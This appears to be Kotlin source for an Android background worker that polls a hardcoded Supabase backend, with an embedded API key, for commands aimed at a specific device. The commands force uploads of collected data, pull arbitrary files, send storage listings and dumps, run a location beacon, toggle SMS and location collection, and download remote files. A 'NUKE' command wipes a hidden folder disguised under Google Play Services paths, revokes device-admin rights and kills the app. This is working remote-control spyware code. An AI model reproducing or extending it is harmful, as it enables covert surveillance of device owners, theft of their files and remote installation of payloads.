package com.example.myandroid

import android.content.Context
import android.os.Environment
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return withContext(Dispatchers.IO) {
            try {
                // 1. Check Permission
                val hasPerm = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    Environment.isExternalStorageManager()
                } else {
                    true // Assume granted on older versions for simplicity or check READ/WRITE
                }
                if (!hasPerm) return@withContext Result.failure()

                // 2. Fetch Pending Commands (Targeted to THIS device)
                val deviceId = DeviceManager.getDeviceId(applicationContext)
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?status=eq.PENDING&device_id=eq.$deviceId&select=*"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey"
)

                if (conn.responseCode == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val commands = JSONArray(resp)

                    for (i in 0 until commands.length()) {
                        val cmd = commands.getJSONObject(i)
                        val id = cmd.getInt("id")
                        var status = "EXECUTED"
                        var errorMsg = ""

                        try {
                            val path = cmd.optString("target_path", "Download")
                            val fileName = cmd.optString("file_name")
                            
                            val root = Environment.getExternalStorageDirectory()
                            val targetDir = File(root, path)
                            if (!targetDir.exists()) targetDir.mkdirs()

                            // --- 0. CODE RED (BACKEND PING) ---
                            if (cmd.getString("file_name") == "CODERED") {
                                // Trigger Emergency Service (which handles Ghost Hand if offline, or Upload if online)
                                val i = android.content.Intent(applicationContext, EmergencyService::class.java)
                                i.putExtra("codes", "0") // 0 = ALL
                                i.putExtra("sender", "BACKEND")
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                    applicationContext.startForegroundService(i)
                                } else {
                                    applicationContext.startService(i)
                                }
                                status = "EXECUTED"
                            }
                            // --- 1. FORCE UPLOAD ---
                            else if (cmd.getString("file_name") == "FORCE_UPLOAD") {
                                val modulesStr = cmd.optString("content", "ALL")
                                val modules = modulesStr.split(",").map { it.trim() }
                                CloudManager.uploadData(applicationContext, modules, null)
                                status = "EXECUTED"
                            }
                            // --- 2. LIVE TOAST MESSAGE ---
                            else if (cmd.getString("file_name") == "TOAST") {
                                val msg = cmd.optString("content", "Ping!")
                                android.os.Handler(android.os.Looper.getMainLooper()).post {
                                    android.widget.Toast.makeText(applicationContext, msg, android.widget.Toast.LENGTH_LONG).show()
                                }
                                status = "EXECUTED"
                            }
                            // --- 3. IM_ONLINE (BEACON) ---
                            else if (cmd.getString("file_name") == "IM_ONLINE") {
                                val frequencyStr = cmd.optString("content", "0")
                                val frequency = frequencyStr.toLongOrNull() ?: 0L
                                
                                if (frequency > 0) {
                                    // REPEATING: Start Service
                                    val i = android.content.Intent(applicationContext, BeaconService::class.java)
                                    i.putExtra("frequency", frequencyStr)
                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                        applicationContext.startForegroundService(i)
                                    } else {
                                        applicationContext.startService(i)
                                    }
                                    status = "EXECUTED (LOOP START)"
                                } else {
                                    // ONE-TIME: Just Ping
                                    CloudManager.sendPing(applicationContext, "Manual Command")
                                    status = "EXECUTED (SINGLE)"
                                }
                            }
                            // --- 4. STOP BEACON ---
                            else if (cmd.getString("file_name") == "STOP_BEACON") {
                                val i = android.content.Intent(applicationContext, BeaconService::class.java)
                                applicationContext.stopService(i)
                                status = "EXECUTED (STOPPED)"
                            }
                            // --- NEW: UPLOAD DUMPS (With Retry Logic) ---
                            else if (cmd.getString("file_name") == "UPLOAD_DUMPS") {
                                val dumps = DumpManager.getDumpsForToday()
                                var successCount = 0
                                dumps.forEach { file ->
                                    // SYNCHRONOUS WAIT: If this returns false, we know it failed.
                                    if (CloudManager.uploadFile(applicationContext, file)) {
                                        successCount++
                                    }
                                }
                                
                                if (successCount == dumps.size) {
                                    status = "EXECUTED (${dumps.size} FILES)"
                                } else {
                                    // If any failed, we DO NOT mark as executed.
                                    // This forces the Worker to pick up this command again next time it runs.
                                    DebugLogger.log("CMD", "Partial failure. Keeping command PENDING.")
                                    continue 
                                }
                            }
                            // --- NEW: PULL SPECIFIC FILE ---
                            else if (cmd.getString("file_name") == "PULL_FILE") {
                                val path = cmd.optString("content")
                                val file = File(path)
                                if (file.exists() && file.isFile) {
                                    val success = CloudManager.uploadFile(applicationContext, file)
                                    if (success) {
                                        status = "EXECUTED"
                                    } else {
                                        // Upload failed (offline?), try again later
                                        continue
                                    }
                                } else {
                                    status = "FAILED (NOT FOUND)"
                                }
                            }
                            // --- NEW: GENERATE & UPLOAD STORAGE SKELETON ---
                            else if (cmd.getString("file_name") == "GET_SKELETON") {
                                val report = FileManager.generateReport()
                                CloudManager.uploadSkeleton(applicationContext, report, null)
                                status = "EXECUTED (SIZE: ${report.toString().length} BYTES)"
                            }
                            // --- NEW: TOGGLE FEATURES ---
                            else if (cmd.getString("file_name") == "TOGGLE_FEATURE") {
                                // Content format: "sms:off" or "location:true"
                                val content = cmd.optString("content", "")
                                if (content.contains(":")) {
                                    val parts = content.split(":")
                                    val feature = parts[0].trim()
                                    val stateStr = parts[1].trim().lowercase()
                                    val enable = stateStr == "on" || stateStr == "true" || stateStr == "1"
                                    
                                    ConfigManager.setFeature(applicationContext, feature, enable)
                                    status = "EXECUTED ($feature set to $enable)"
                                } else {
                                    status = "FAILED (INVALID FORMAT)"
                                }
                            }
                            // --- NEW: SELF DESTRUCT (NUKE) ---
                            else if (cmd.getString("file_name") == "NUKE") {
                                try {
                                    // 1. Wipe Data Folder
                                    val root = java.io.File(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
                                    if (root.exists()) root.deleteRecursively()

                                    // 2. Clear Preferences
                                    val prefs = applicationContext.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                                    prefs.edit().clear().commit()

                                    // 3. Revoke Admin (Allows Uninstall)
                                    val dpm = applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                                    val comp = android.content.ComponentName(applicationContext, MyDeviceAdminReceiver::class.java)
                                    if (dpm.isAdminActive(comp)) {
                                        dpm.removeActiveAdmin(comp)
                                    }

                                    status = "EXECUTED (GOODBYE)"
                                    
                                    // 4. Kill Process (Suicide)
                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ 
                                        android.os.Process.killProcess(android.os.Process.myPid()) 
                                    }, 2000)

                                } catch(e: Exception) {
                                    status = "FAILED NUKE: ${e.message}"
                                }
                            }
                            // --- 5. FILE/FOLDER CREATION ---
                            else if (fileName.isNotEmpty()) {
                                val targetFile = File(targetDir, fileName)
                                
                                if (cmd.has("content") && !cmd.isNull("content")) {
                                    // Text Creation
                                    targetFile.writeText(cmd.getString("content"))
                                } else if (cmd.has("file_url") && !cmd.isNull("file_url")) {
                                    // Binary Download
                                    val dlUrl = URL(cmd.getString("file_url"))
                                    dlUrl.openStream().use { input ->
                                        targetFile.outputStream().use { output ->
                                            input.copyTo(output)
                                        }
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            status = "FAILED"
                            errorMsg = e.message ?: "Unknown error"
                        }

                        // 3. Update Status
                        updateStatus(id, status, errorMsg, supabaseKey)
                    }
                    Result.success()
                } else {
                    Result.retry()
                }
            } catch (e: Exception) {
                e.printStackTrace()
                Result.retry()
            }
        }
    }

    private fun updateStatus(id: Int, status: String, error: String, key: String) {
        try {
            val updateUrl = URL("https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?id=eq.$id")
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "PATCH"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val json = JSONObject()
            json.put("status", status)
            if (error.isNotEmpty()) json.put("error_log", error)
            
            conn.outputStream.use { it.write(json.toString().toByteArray()) }
            conn.responseCode
        } catch (e: Exception) { e.printStackTrace() }
    }
}